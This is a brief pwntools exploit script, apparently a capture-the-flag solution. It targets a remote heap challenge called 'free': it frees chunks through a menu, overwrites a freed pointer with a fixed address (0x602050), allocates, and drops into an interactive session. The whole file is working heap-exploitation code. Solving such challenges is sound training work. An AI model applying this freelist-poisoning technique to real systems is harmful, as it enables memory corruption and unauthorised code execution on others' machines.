#!/usr/bin/env python
from pwn import *

# 

host , port = 'ctf.yuawn.idv.tw' , 10208
y = remote( host , port )


context.arch = 'amd64'

e , l = ELF('./free') , ELF('./libc.so.6')

def add( size , data ):
    y.sendafter( 'ice:' , '1' )
    y.sendafter( ':' , str( size ) )
    y.sendafter( ':' , data )

def sho( idx ):
    y.sendafter( 'ice:' , '3' )
    y.sendafter( ':' , str( idx ) )

def edt( idx , data ):
    y.sendafter( 'ice:' , '2' )
    y.sendafter( ':' , str( idx ) )
    y.sendafter( ':' , data )




# 0x602050

y.sendafter( '?' , 'yuawn' )
y.sendafter( '?' , str( 0x21 ) )

y.sendafter( 'ice:' , '4' )
y.sendafter( ')' , '1' )
y.sendafter( ')' , '1' )
y.sendafter( ')' , '0' )

y.sendafter( 'ice:' , '4' )
y.sendafter( ')' , '1' )
y.sendafter( ')' , '0' )
y.sendafter( ':' , p64( 0x602050 ) )

add( 0x18 , 'A' )

y.interactive()